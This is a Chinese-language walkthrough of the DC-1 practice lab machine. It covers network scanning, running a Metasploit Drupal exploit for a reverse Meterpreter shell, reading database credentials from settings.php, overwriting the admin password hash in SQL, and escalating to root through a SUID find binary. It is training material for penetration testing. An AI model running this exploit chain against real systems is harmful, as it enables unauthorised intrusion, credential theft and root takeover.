# DC1

配置环境vmware17 + nat网络配置

下载地址:[DC and Five86 Series Challenges - DC-1](https://www.five86.com/dc-1.html)

攻击机kali与其在同一网段下 ip:192.168.31.131

### 信息收集

```bash
arp-scan -l #内网探测，扫描目标ip
```

![image-20231128213648254](http://111.229.225.13:81/i/2023/11/28/zc0qys-2.png)

发现**目标ip**192.168.31.135

使用nmap对目标进行扫描

```bash
nmap -T4 -sV -O -A -P 192.168.31.135
```

![image-20231128214040148](http://111.229.225.13:81/i/2023/11/28/zecwgv-2.png)

发现开放端口80，22，111

先访问80的http服务

![image-20231128214143785](http://111.229.225.13:81/i/2023/11/28/zez12z-2.png)

发现了Drupal系统

### 漏洞利用

寻找历史漏洞

![image-20231128214246111](http://111.229.225.13:81/i/2023/11/28/zfkvgw-2.png)

使用msf查看有没有此漏洞的exp利用

```bash
msfconsole
search Drupal
```

![image-20231128214359405](http://111.229.225.13:81/i/2023/11/28/zghm8s-2.png)

选择第二个，远程命令执行

```bash
use 1
```

![image-20231128214543280](http://111.229.225.13:81/i/2023/11/28/zhcewo-2.png)

设置目标ip以及payload

```bash
set RHOST 192.168.31.135
set payload php/meterpreter/reverse_tcp #上图中默认的payload =>defaulting to php/meterpreter/reverse_tcp
```

开始利用

```bash
exploit
```

等待一下

![image-20231128214842816](http://111.229.225.13:81/i/2023/11/28/zj4nxa-2.png)

使用shell，然后利用python 创建交互式shell

```bash
shell
python -c 'import pty;pty.spawn("/bin/bash");'
```



![image-20231128215005647](http://111.229.225.13:81/i/2023/11/28/zk3i2c-2.png)

### 内网信息收集

查看信息

![image-20231128215113789](http://111.229.225.13:81/i/2023/11/28/zkqzak-2.png)

![image-20231128215533209](http://111.229.225.13:81/i/2023/11/28/zn8oz0-2.png)

翻译过来，就是让你去找配置文件

这里采用find命令

```bash
find ./ -type f -name "*config*" -o -name "*setting*"#从此目录下递归查找文件名带有config或者setting的文件
```

![image-20231129161547417](http://111.229.225.13:81/i/2023/11/29/qpvwcx-2.png)

经查找在 ./sites/default/settings.php 有东西

```bash
cat ./sites/default/settings.php
```

![image-20231129161725925](http://111.229.225.13:81/i/2023/11/29/qqvv3o-2.png)

### 修改数据库密码

数据库账号密码

进入数据库

```bash
mysql -udbuser -pR0ck3t
```

查看数据

```mysql
show databases;
```

![image-20231129162100282](http://111.229.225.13:81/i/2023/11/29/qt3w6p-2.png)

切换数据库

```mysql
use drupaldb;
```

查看表

```mysql
show tables;
```

![image-20231129162315358](http://111.229.225.13:81/i/2023/11/29/que57w-2.png)

```mysql
select * from users;
```

![image-20231129162429016](http://111.229.225.13:81/i/2023/11/29/qv4827-2.png)

在这里可以发现密码做了加密处理，所以必然有加密函数，可以通过加密一段密码替换原有的密码从而使用管理员身份登录

```bash
find ./ -type f -name "*password*"
```

![image-20231129162656851](http://111.229.225.13:81/i/2023/11/29/qwf88z-2.png)

置换密码

```mysql
update users set pass = "$S$DM/Wwb8I3NnMzCf4bGsGzoNV0tUQzvxJKTCN3E4mE2CQoODuQdtL" where uid = 1;
```

![image-20231129163106371](http://111.229.225.13:81/i/2023/11/29/qz3n12-2.png)

登录网页

admin 123456

![image-20231129163220671](http://111.229.225.13:81/i/2023/11/29/qzs4kp-2.png)

![image-20231129163311309](http://111.229.225.13:81/i/2023/11/29/r0bmmb-2.png)

![image-20231129163353869](http://111.229.225.13:81/i/2023/11/29/r0lg3e-2.png)

翻译为，特殊的PERMS 将帮助查找passwd——但是您需要-exec 该命令来确定如何获取shadow中的内容。

### 权限提升

再使用find命令尝试提权

```bash
find / -perm -u=s -type f  #从根目录找具有root权限的文件
```

![image-20231129164018713](http://111.229.225.13:81/i/2023/11/29/r4jqkq-2.png)

发现find命令存在root权限，利用findml进行提权

```bash
find ./ 存在的文件名 -exec  "/bin/sh" \;
```

![image-20231129164506185](http://111.229.225.13:81/i/2023/11/29/r7fnky-2.png)

成功提权

找flag

```bash
find / -type f -name "*flag*"
```

![image-20231129164749788](http://111.229.225.13:81/i/2023/11/29/r8vzz3-2.png)

### 总结

1. nmap信息收集,wappalyzer插件找cms

   ```bash
   nmap -T4 -sV -O -A -P ip //T4速度 -sV查看服务 -O操作系统 -p端口 	     将所有主机视为在在线，跳过主机发现
   ```

   

2. 漏洞利用Drupal 

   ```bash
   msfconsole
   msf6>search Drupal
   msf6>use 1
   msf6>set RHOST 目标ip
   msf6>set payload 默认payload
   meterpreter>shell
   python -c 'import pty;pty.spawn("/bin/bash");' 使用python创建一个交互式shell
   ```

   

3. find命令进行信息收集

4. 数据库改密码

   ```mysql
   update 表名 set 字段 = "修改的值" where 对应其他字段 = "当前存在的值"
   ```

5. 权限提升suid提权